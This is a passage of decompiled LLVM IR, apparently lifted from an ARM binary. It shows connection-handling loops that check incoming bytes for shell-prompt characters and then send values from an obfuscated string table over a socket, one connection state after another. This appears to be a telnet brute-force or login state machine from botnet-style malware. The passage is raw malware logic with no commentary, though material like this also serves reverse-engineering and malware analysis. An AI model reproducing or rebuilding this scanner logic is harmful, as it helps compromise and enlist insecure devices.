  %v3_f1cc = icmp ugt i8 %v3_f1c4, 57
  store i1 %v3_f1cc, i1* %cpsr_c.global-to-local, align 1
  %v8_f1cc = icmp eq i8 %v3_f1c4, 58
  store i1 %v8_f1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1cc, label %dec_label_pc_f22c, label %dec_label_pc_f1d4

dec_label_pc_f1d4:                                ; preds = %bb438
  %v2_f1d4 = icmp ugt i8 %v3_f1c4, 35
  store i1 %v2_f1d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1d4 = icmp eq i8 %v3_f1c4, 36
  store i1 %v7_f1d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1d4, label %dec_label_pc_f22c, label %dec_label_pc_f1dc

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1d4
  %v2_f1dc = icmp ugt i8 %v3_f1c4, 34
  store i1 %v2_f1dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f1dc = icmp eq i8 %v3_f1c4, 35
  store i1 %v7_f1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1dc, label %dec_label_pc_f22c, label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f1dc
  %v2_f1e4 = icmp ugt i8 %v3_f1c4, 36
  store i1 %v2_f1e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1e4 = icmp eq i8 %v3_f1c4, 37
  store i1 %v7_f1e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1e4, label %dec_label_pc_f22c, label %dec_label_pc_f214.preheader

dec_label_pc_f214.preheader:                      ; preds = %dec_label_pc_f1e4
  %v3_f1e8 = add i32 %v0_edf4, 28
  %v2_f1ec = add i32 %v3_f1e8, %v3_f1b0
  store i32 %v2_f1ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f214

dec_label_pc_f1f8:                                ; preds = %bb439
  %v2_f1f8 = icmp ugt i8 %v3_f21c, 35
  store i1 %v2_f1f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f8 = icmp eq i8 %v3_f21c, 36
  store i1 %v7_f1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f8, label %dec_label_pc_f22c, label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f1f8
  %v2_f200 = icmp ugt i8 %v3_f21c, 34
  store i1 %v2_f200, i1* %cpsr_c.global-to-local, align 1
  %v7_f200 = icmp eq i8 %v3_f21c, 35
  store i1 %v7_f200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f200, label %dec_label_pc_f22c, label %dec_label_pc_f208

dec_label_pc_f208:                                ; preds = %dec_label_pc_f200
  %v2_f208 = icmp ugt i8 %v3_f21c, 36
  store i1 %v2_f208, i1* %cpsr_c.global-to-local, align 1
  %v7_f208 = icmp eq i8 %v3_f21c, 37
  store i1 %v7_f208, i1* %cpsr_z.global-to-local, align 1
  %v1_f20c = add i32 %v0_f20c, -1
  store i32 %v1_f20c, i32* %r3.global-to-local, align 4
  br i1 %v7_f208, label %dec_label_pc_f22c, label %dec_label_pc_f214

dec_label_pc_f214:                                ; preds = %dec_label_pc_f214.preheader, %dec_label_pc_f208
  %v0_f20c = phi i32 [ %v2_f1ec, %dec_label_pc_f214.preheader ], [ %v1_f20c, %dec_label_pc_f208 ]
  %v0_f214 = phi i32 [ %v1_f1b4, %dec_label_pc_f214.preheader ], [ %v1_f214, %dec_label_pc_f208 ]
  %v1_f214 = add i32 %v0_f214, -1
  store i32 %v1_f214, i32* %r1.global-to-local, align 4
  %v2_f214 = icmp ne i32 %v0_f214, 0
  store i1 %v2_f214, i1* %cpsr_c.global-to-local, align 1
  %v7_f214 = icmp eq i32 %v0_f214, 1
  store i1 %v7_f214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f214, label %dec_label_pc_ed78.backedge.thread561, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f214
  %v1_f21c = add i32 %v0_f20c, -2
  %v2_f21c = inttoptr i32 %v1_f21c to i8*
  %v3_f21c = load i8, i8* %v2_f21c, align 1
  %v4_f21c = zext i8 %v3_f21c to i32
  store i32 %v4_f21c, i32* %r2.global-to-local, align 4
  %v2_f220 = icmp ugt i8 %v3_f21c, 61
  store i1 %v2_f220, i1* %cpsr_c.global-to-local, align 1
  %v7_f220 = icmp eq i8 %v3_f21c, 62
  store i1 %v7_f220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f220, label %dec_label_pc_f22c, label %bb439

bb439:                                            ; preds = %dec_label_pc_f21c
  %v3_f224 = icmp ugt i8 %v3_f21c, 57
  store i1 %v3_f224, i1* %cpsr_c.global-to-local, align 1
  %v8_f224 = icmp eq i8 %v3_f21c, 58
  store i1 %v8_f224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f224, label %dec_label_pc_f22c, label %dec_label_pc_f1f8

dec_label_pc_f22c:                                ; preds = %dec_label_pc_f21c, %bb439, %dec_label_pc_f208, %dec_label_pc_f200, %dec_label_pc_f1f8, %dec_label_pc_f1e4, %dec_label_pc_f1c0, %dec_label_pc_f1dc, %dec_label_pc_f1d4, %bb438
  %v0_f230 = phi i32 [ %v1_f1b4, %dec_label_pc_f1e4 ], [ %v1_f1b4, %dec_label_pc_f1c0 ], [ %v1_f1b4, %dec_label_pc_f1dc ], [ %v1_f1b4, %dec_label_pc_f1d4 ], [ %v1_f1b4, %bb438 ], [ %v1_f214, %dec_label_pc_f1f8 ], [ %v1_f214, %dec_label_pc_f200 ], [ %v1_f214, %dec_label_pc_f208 ], [ %v1_f214, %bb439 ], [ %v1_f214, %dec_label_pc_f21c ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f230 = add i32 %v0_f230, 1
  store i32 %v1_f230, i32* @r7, align 4
  %v1_f234 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f244 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f244, i32* %r0.global-to-local, align 4
  %v3_f248 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f248, i32* %r2.global-to-local, align 4
  store i32 %v3_f244, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f254 = load i32, i32* @r6, align 4
  %v1_f254 = add i32 %v0_f254, 4
  %v2_f254 = inttoptr i32 %v1_f254 to i32*
  %v3_f254 = load i32, i32* %v2_f254, align 4
  store i32 %v3_f254, i32* %r0.global-to-local, align 4
  %v4_f258 = call i32 @__libc_send(i32 %v3_f254, i32 %v3_f244, i32 %v3_f248, i32 16384)
  store i32 %v4_f258, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f268 = load i32, i32* @r6, align 4
  %v1_f268 = add i32 %v0_f268, 4
  %v2_f268 = inttoptr i32 %v1_f268 to i32*
  %v3_f268 = load i32, i32* %v2_f268, align 4
  store i32 %v3_f268, i32* %r0.global-to-local, align 4
  %v4_f26c = call i32 @__libc_send(i32 %v3_f268, i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f274 = call i32 @table_lock_val(i32 6)
  store i32 %v1_f274, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f27c = load i32, i32* @r6, align 4
  %v2_f27c = add i32 %v1_f27c, 12
  %v3_f27c = inttoptr i32 %v2_f27c to i32*
  store i32 7, i32* %v3_f27c, align 4
  br label %dec_label_pc_ef10

dec_label_pc_f284:                                ; preds = %dec_label_pc_edf4
  %v1_f284 = add i32 %v0_edf4, 24
  %v2_f284 = inttoptr i32 %v1_f284 to i32*
  %v3_f284 = load i32, i32* %v2_f284, align 4
  store i32 %v3_f284, i32* %r2.global-to-local, align 4
  %v1_f288 = add i32 %v3_f284, -1
  store i32 %v1_f288, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f28c = icmp eq i32 %v1_f288, 0
  store i1 %v2_f28c, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f288, 1
  br i1 %tmp440, label %dec_label_pc_ed78.backedge.thread, label %dec_label_pc_f294

dec_label_pc_f294:                                ; preds = %dec_label_pc_f284
  %v2_f294 = add i32 %v1_f288, %v0_edf4
  store i32 %v2_f294, i32* %r3.global-to-local, align 4
  %v1_f298 = add i32 %v2_f294, 28
  %v2_f298 = inttoptr i32 %v1_f298 to i8*
  %v3_f298 = load i8, i8* %v2_f298, align 1
  %v4_f298 = zext i8 %v3_f298 to i32
  store i32 %v4_f298, i32* %r3.global-to-local, align 4
  %v2_f29c = icmp ugt i8 %v3_f298, 61
  store i1 %v2_f29c, i1* %cpsr_c.global-to-local, align 1
  %v7_f29c = icmp eq i8 %v3_f298, 62
  store i1 %v7_f29c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f29c, label %dec_label_pc_f300, label %bb441

bb441:                                            ; preds = %dec_label_pc_f294
  %v3_f2a0 = icmp ugt i8 %v3_f298, 57
  store i1 %v3_f2a0, i1* %cpsr_c.global-to-local, align 1
  %v8_f2a0 = icmp eq i8 %v3_f298, 58
  store i1 %v8_f2a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f2a0, label %dec_label_pc_f300, label %dec_label_pc_f2a8

dec_label_pc_f2a8:                                ; preds = %bb441
  %v2_f2a8 = icmp ugt i8 %v3_f298, 35
  store i1 %v2_f2a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2a8 = icmp eq i8 %v3_f298, 36
  store i1 %v7_f2a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2a8, label %dec_label_pc_f300, label %dec_label_pc_f2b0

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2a8
  %v2_f2b0 = icmp ugt i8 %v3_f298, 34
  store i1 %v2_f2b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f2b0 = icmp eq i8 %v3_f298, 35
  store i1 %v7_f2b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2b0, label %dec_label_pc_f300, label %dec_label_pc_f2b8

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f2b0
  %v2_f2b8 = icmp ugt i8 %v3_f298, 36
  store i1 %v2_f2b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2b8 = icmp eq i8 %v3_f298, 37
  store i1 %v7_f2b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2b8, label %dec_label_pc_f300, label %dec_label_pc_f2e8.preheader

dec_label_pc_f2e8.preheader:                      ; preds = %dec_label_pc_f2b8
  %v3_f2bc = add i32 %v0_edf4, 28
  %v2_f2c0 = add i32 %v3_f2bc, %v3_f284
  store i32 %v2_f2c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f2e8

dec_label_pc_f2cc:                                ; preds = %bb442
  %v2_f2cc = icmp ugt i8 %v3_f2f0, 35
  store i1 %v2_f2cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f2cc = icmp eq i8 %v3_f2f0, 36
  store i1 %v7_f2cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2cc, label %dec_label_pc_f300, label %dec_label_pc_f2d4

dec_label_pc_f2d4:                                ; preds = %dec_label_pc_f2cc
  %v2_f2d4 = icmp ugt i8 %v3_f2f0, 34
  store i1 %v2_f2d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f2d4 = icmp eq i8 %v3_f2f0, 35
  store i1 %v7_f2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2d4, label %dec_label_pc_f300, label %dec_label_pc_f2dc

dec_label_pc_f2dc:                                ; preds = %dec_label_pc_f2d4
  %v2_f2dc = icmp ugt i8 %v3_f2f0, 36
  store i1 %v2_f2dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f2dc = icmp eq i8 %v3_f2f0, 37
  store i1 %v7_f2dc, i1* %cpsr_z.global-to-local, align 1
  %v1_f2e0 = add i32 %v0_f2e0, -1
  store i32 %v1_f2e0, i32* %r3.global-to-local, align 4
  br i1 %v7_f2dc, label %dec_label_pc_f300, label %dec_label_pc_f2e8

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2e8.preheader, %dec_label_pc_f2dc
  %v0_f2e0 = phi i32 [ %v2_f2c0, %dec_label_pc_f2e8.preheader ], [ %v1_f2e0, %dec_label_pc_f2dc ]
  %v0_f2e8 = phi i32 [ %v1_f288, %dec_label_pc_f2e8.preheader ], [ %v1_f2e8, %dec_label_pc_f2dc ]
  %v1_f2e8 = add i32 %v0_f2e8, -1
  store i32 %v1_f2e8, i32* %r1.global-to-local, align 4
  %v2_f2e8 = icmp ne i32 %v0_f2e8, 0
  store i1 %v2_f2e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2e8 = icmp eq i32 %v0_f2e8, 1
  store i1 %v7_f2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2e8, label %dec_label_pc_ed78.backedge.thread561, label %dec_label_pc_f2f0

dec_label_pc_f2f0:                                ; preds = %dec_label_pc_f2e8
  %v1_f2f0 = add i32 %v0_f2e0, -2
  %v2_f2f0 = inttoptr i32 %v1_f2f0 to i8*
  %v3_f2f0 = load i8, i8* %v2_f2f0, align 1
  %v4_f2f0 = zext i8 %v3_f2f0 to i32
  store i32 %v4_f2f0, i32* %r2.global-to-local, align 4
  %v2_f2f4 = icmp ugt i8 %v3_f2f0, 61
  store i1 %v2_f2f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f2f4 = icmp eq i8 %v3_f2f0, 62
  store i1 %v7_f2f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2f4, label %dec_label_pc_f300, label %bb442

bb442:                                            ; preds = %dec_label_pc_f2f0
  %v3_f2f8 = icmp ugt i8 %v3_f2f0, 57
  store i1 %v3_f2f8, i1* %cpsr_c.global-to-local, align 1
  %v8_f2f8 = icmp eq i8 %v3_f2f0, 58
  store i1 %v8_f2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f2f8, label %dec_label_pc_f300, label %dec_label_pc_f2cc

dec_label_pc_f300:                                ; preds = %dec_label_pc_f2f0, %bb442, %dec_label_pc_f2dc, %dec_label_pc_f2d4, %dec_label_pc_f2cc, %dec_label_pc_f2b8, %dec_label_pc_f294, %dec_label_pc_f2b0, %dec_label_pc_f2a8, %bb441
  %v0_f304 = phi i32 [ %v1_f288, %dec_label_pc_f2b8 ], [ %v1_f288, %dec_label_pc_f294 ], [ %v1_f288, %dec_label_pc_f2b0 ], [ %v1_f288, %dec_label_pc_f2a8 ], [ %v1_f288, %bb441 ], [ %v1_f2e8, %dec_label_pc_f2cc ], [ %v1_f2e8, %dec_label_pc_f2d4 ], [ %v1_f2e8, %dec_label_pc_f2dc ], [ %v1_f2e8, %bb442 ], [ %v1_f2e8, %dec_label_pc_f2f0 ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f304 = add i32 %v0_f304, 1
  store i32 %v1_f304, i32* @r7, align 4
  %v1_f308 = call i32 @table_unlock_val(i32 5)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_f318 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_f318, i32* %r0.global-to-local, align 4
  %v3_f31c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f31c, i32* %r2.global-to-local, align 4
  store i32 %v3_f318, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f328 = load i32, i32* @r6, align 4
  %v1_f328 = add i32 %v0_f328, 4
  %v2_f328 = inttoptr i32 %v1_f328 to i32*
  %v3_f328 = load i32, i32* %v2_f328, align 4
  store i32 %v3_f328, i32* %r0.global-to-local, align 4
  %v4_f32c = call i32 @__libc_send(i32 %v3_f328, i32 %v3_f318, i32 %v3_f31c, i32 16384)
  store i32 %v4_f32c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f33c = load i32, i32* @r6, align 4
  %v1_f33c = add i32 %v0_f33c, 4
  %v2_f33c = inttoptr i32 %v1_f33c to i32*
  %v3_f33c = load i32, i32* %v2_f33c, align 4
  store i32 %v3_f33c, i32* %r0.global-to-local, align 4
  %v4_f340 = call i32 @__libc_send(i32 %v3_f33c, i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f348 = call i32 @table_lock_val(i32 5)
  store i32 %v1_f348, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f350 = load i32, i32* @r6, align 4
  %v2_f350 = add i32 %v1_f350, 12
  %v3_f350 = inttoptr i32 %v2_f350 to i32*
  store i32 6, i32* %v3_f350, align 4
  br label %dec_label_pc_ef10

dec_label_pc_f3d0:                                ; preds = %dec_label_pc_edf4
  %v1_f3d0 = add i32 %v0_edf4, 24
  %v2_f3d0 = inttoptr i32 %v1_f3d0 to i32*
  %v3_f3d0 = load i32, i32* %v2_f3d0, align 4
  store i32 %v3_f3d0, i32* %r2.global-to-local, align 4
  %v1_f3d4 = add i32 %v3_f3d0, -1
  store i32 %v1_f3d4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3d8 = icmp eq i32 %v1_f3d4, 0
  store i1 %v2_f3d8, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f3d4, 1
  br i1 %tmp443, label %dec_label_pc_ed78.backedge.thread, label %dec_label_pc_f3e0

dec_label_pc_f3e0:                                ; preds = %dec_label_pc_f3d0
  %v2_f3e0 = add i32 %v1_f3d4, %v0_edf4
  store i32 %v2_f3e0, i32* %r3.global-to-local, align 4
  %v1_f3e4 = add i32 %v2_f3e0, 28
  %v2_f3e4 = inttoptr i32 %v1_f3e4 to i8*
  %v3_f3e4 = load i8, i8* %v2_f3e4, align 1
  %v4_f3e4 = zext i8 %v3_f3e4 to i32
  store i32 %v4_f3e4, i32* %r3.global-to-local, align 4
  %v2_f3e8 = icmp ugt i8 %v3_f3e4, 61
  store i1 %v2_f3e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3e8 = icmp eq i8 %v3_f3e4, 62
  store i1 %v7_f3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3e8, label %dec_label_pc_f44c, label %bb444

bb444:                                            ; preds = %dec_label_pc_f3e0
  %v3_f3ec = icmp ugt i8 %v3_f3e4, 57
  store i1 %v3_f3ec, i1* %cpsr_c.global-to-local, align 1
  %v8_f3ec = icmp eq i8 %v3_f3e4, 58
  store i1 %v8_f3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f3ec, label %dec_label_pc_f44c, label %dec_label_pc_f3f4

dec_label_pc_f3f4:                                ; preds = %bb444
  %v2_f3f4 = icmp ugt i8 %v3_f3e4, 35
  store i1 %v2_f3f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3f4 = icmp eq i8 %v3_f3e4, 36
  store i1 %v7_f3f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3f4, label %dec_label_pc_f44c, label %dec_label_pc_f3fc

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3f4
  %v2_f3fc = icmp ugt i8 %v3_f3e4, 34
  store i1 %v2_f3fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3fc = icmp eq i8 %v3_f3e4, 35
  store i1 %v7_f3fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3fc, label %dec_label_pc_f44c, label %dec_label_pc_f404

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3fc
  %v2_f404 = icmp ugt i8 %v3_f3e4, 36
  store i1 %v2_f404, i1* %cpsr_c.global-to-local, align 1
  %v7_f404 = icmp eq i8 %v3_f3e4, 37
  store i1 %v7_f404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f404, label %dec_label_pc_f44c, label %dec_label_pc_f434.preheader

dec_label_pc_f434.preheader:                      ; preds = %dec_label_pc_f404
  %v3_f408 = add i32 %v0_edf4, 28
  %v2_f40c = add i32 %v3_f408, %v3_f3d0
  store i32 %v2_f40c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f434

dec_label_pc_f418:                                ; preds = %bb445
  %v2_f418 = icmp ugt i8 %v3_f43c, 35
  store i1 %v2_f418, i1* %cpsr_c.global-to-local, align 1
  %v7_f418 = icmp eq i8 %v3_f43c, 36
  store i1 %v7_f418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f418, label %dec_label_pc_f44c, label %dec_label_pc_f420

dec_label_pc_f420:                                ; preds = %dec_label_pc_f418
  %v2_f420 = icmp ugt i8 %v3_f43c, 34
  store i1 %v2_f420, i1* %cpsr_c.global-to-local, align 1
  %v7_f420 = icmp eq i8 %v3_f43c, 35
  store i1 %v7_f420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f420, label %dec_label_pc_f44c, label %dec_label_pc_f428

dec_label_pc_f428:                                ; preds = %dec_label_pc_f420
  %v2_f428 = icmp ugt i8 %v3_f43c, 36
  store i1 %v2_f428, i1* %cpsr_c.global-to-local, align 1
  %v7_f428 = icmp eq i8 %v3_f43c, 37
  store i1 %v7_f428, i1* %cpsr_z.global-to-local, align 1
  %v1_f42c = add i32 %v0_f42c, -1
  store i32 %v1_f42c, i32* %r3.global-to-local, align 4
  br i1 %v7_f428, label %dec_label_pc_f44c, label %dec_label_pc_f434

dec_label_pc_f434:                                ; preds = %dec_label_pc_f434.preheader, %dec_label_pc_f428
  %v0_f42c = phi i32 [ %v2_f40c, %dec_label_pc_f434.preheader ], [ %v1_f42c, %dec_label_pc_f428 ]
  %v0_f434 = phi i32 [ %v1_f3d4, %dec_label_pc_f434.preheader ], [ %v1_f434, %dec_label_pc_f428 ]
  %v1_f434 = add i32 %v0_f434, -1
  store i32 %v1_f434, i32* %r1.global-to-local, align 4
  %v2_f434 = icmp ne i32 %v0_f434, 0
  store i1 %v2_f434, i1* %cpsr_c.global-to-local, align 1
  %v7_f434 = icmp eq i32 %v0_f434, 1
  store i1 %v7_f434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f434, label %dec_label_pc_ed78.backedge.thread561, label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %dec_label_pc_f434
  %v1_f43c = add i32 %v0_f42c, -2
  %v2_f43c = inttoptr i32 %v1_f43c to i8*
  %v3_f43c = load i8, i8* %v2_f43c, align 1
  %v4_f43c = zext i8 %v3_f43c to i32
  store i32 %v4_f43c, i32* %r2.global-to-local, align 4
  %v2_f440 = icmp ugt i8 %v3_f43c, 61
  store i1 %v2_f440, i1* %cpsr_c.global-to-local, align 1
  %v7_f440 = icmp eq i8 %v3_f43c, 62
  store i1 %v7_f440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f440, label %dec_label_pc_f44c, label %bb445

bb445:                                            ; preds = %dec_label_pc_f43c
  %v3_f444 = icmp ugt i8 %v3_f43c, 57
  store i1 %v3_f444, i1* %cpsr_c.global-to-local, align 1
  %v8_f444 = icmp eq i8 %v3_f43c, 58
  store i1 %v8_f444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f444, label %dec_label_pc_f44c, label %dec_label_pc_f418

dec_label_pc_f44c:                                ; preds = %dec_label_pc_f43c, %bb445, %dec_label_pc_f428, %dec_label_pc_f420, %dec_label_pc_f418, %dec_label_pc_f404, %dec_label_pc_f3e0, %dec_label_pc_f3fc, %dec_label_pc_f3f4, %bb444
  %v0_f450 = phi i32 [ %v1_f3d4, %dec_label_pc_f404 ], [ %v1_f3d4, %dec_label_pc_f3e0 ], [ %v1_f3d4, %dec_label_pc_f3fc ], [ %v1_f3d4, %dec_label_pc_f3f4 ], [ %v1_f3d4, %bb444 ], [ %v1_f434, %dec_label_pc_f418 ], [ %v1_f434, %dec_label_pc_f420 ], [ %v1_f434, %dec_label_pc_f428 ], [ %v1_f434, %bb445 ], [ %v1_f434, %dec_label_pc_f43c ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f450 = add i32 %v0_f450, 1
  store i32 %v1_f450, i32* @r7, align 4
  %v1_f454 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_f464 = call i32 @table_retrieve_val(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_f464, i32* %r0.global-to-local, align 4
  %v3_f468 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f468, i32* %r2.global-to-local, align 4
  store i32 %v3_f464, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f474 = load i32, i32* @r6, align 4
  %v1_f474 = add i32 %v0_f474, 4
  %v2_f474 = inttoptr i32 %v1_f474 to i32*
  %v3_f474 = load i32, i32* %v2_f474, align 4
  store i32 %v3_f474, i32* %r0.global-to-local, align 4
  %v4_f478 = call i32 @__libc_send(i32 %v3_f474, i32 %v3_f464, i32 %v3_f468, i32 16384)
  store i32 %v4_f478, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f488 = load i32, i32* @r6, align 4
  %v1_f488 = add i32 %v0_f488, 4
  %v2_f488 = inttoptr i32 %v1_f488 to i32*
  %v3_f488 = load i32, i32* %v2_f488, align 4
  store i32 %v3_f488, i32* %r0.global-to-local, align 4
  %v4_f48c = call i32 @__libc_send(i32 %v3_f488, i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f494 = call i32 @table_lock_val(i32 4)
  store i32 %v1_f494, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f49c = load i32, i32* @r6, align 4
  %v2_f49c = add i32 %v1_f49c, 12
  %v3_f49c = inttoptr i32 %v2_f49c to i32*
  store i32 8, i32* %v3_f49c, align 4
  br label %dec_label_pc_ef10

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_edf4
  %v1_f4a4 = add i32 %v0_edf4, 24
  %v2_f4a4 = inttoptr i32 %v1_f4a4 to i32*
  %v3_f4a4 = load i32, i32* %v2_f4a4, align 4
  store i32 %v3_f4a4, i32* %r2.global-to-local, align 4
  %v1_f4a8 = add i32 %v3_f4a4, -1
  store i32 %v1_f4a8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4ac = icmp eq i32 %v1_f4a8, 0
  store i1 %v2_f4ac, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_f4a8, 1
  br i1 %tmp446, label %dec_label_pc_f510, label %dec_label_pc_f4b4

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f4a4
  %v2_f4b4 = add i32 %v1_f4a8, %v0_edf4
  store i32 %v2_f4b4, i32* %r3.global-to-local, align 4
  %v1_f4b8 = add i32 %v2_f4b4, 28
  %v2_f4b8 = inttoptr i32 %v1_f4b8 to i8*
  %v3_f4b8 = load i8, i8* %v2_f4b8, align 1
  %v4_f4b8 = zext i8 %v3_f4b8 to i32
  store i32 %v4_f4b8, i32* %r3.global-to-local, align 4
  %v2_f4bc = icmp ugt i8 %v3_f4b8, 61
  store i1 %v2_f4bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4bc = icmp eq i8 %v3_f4b8, 62
  store i1 %v7_f4bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4bc, label %dec_label_pc_f778, label %bb447

bb447:                                            ; preds = %dec_label_pc_f4b4
  %v3_f4c0 = icmp ugt i8 %v3_f4b8, 57
  store i1 %v3_f4c0, i1* %cpsr_c.global-to-local, align 1
  %v8_f4c0 = icmp eq i8 %v3_f4b8, 58
  store i1 %v8_f4c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4c0, label %dec_label_pc_f778, label %dec_label_pc_f4c8

dec_label_pc_f4c8:                                ; preds = %bb447
  %v2_f4c8 = icmp ugt i8 %v3_f4b8, 35
  store i1 %v2_f4c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4c8 = icmp eq i8 %v3_f4b8, 36
  store i1 %v7_f4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4c8, label %dec_label_pc_f778, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f4c8
  %v2_f4d0 = icmp ugt i8 %v3_f4b8, 34
  store i1 %v2_f4d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4d0 = icmp eq i8 %v3_f4b8, 35
  store i1 %v7_f4d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4d0, label %dec_label_pc_f778, label %dec_label_pc_f508.preheader

dec_label_pc_f508.preheader:                      ; preds = %dec_label_pc_f4d0
  %v3_f4d4 = add i32 %v0_edf4, 28
  %v2_f4d8 = add i32 %v3_f4d4, %v3_f4a4
  store i32 %v2_f4d8, i32* %r3.global-to-local, align 4
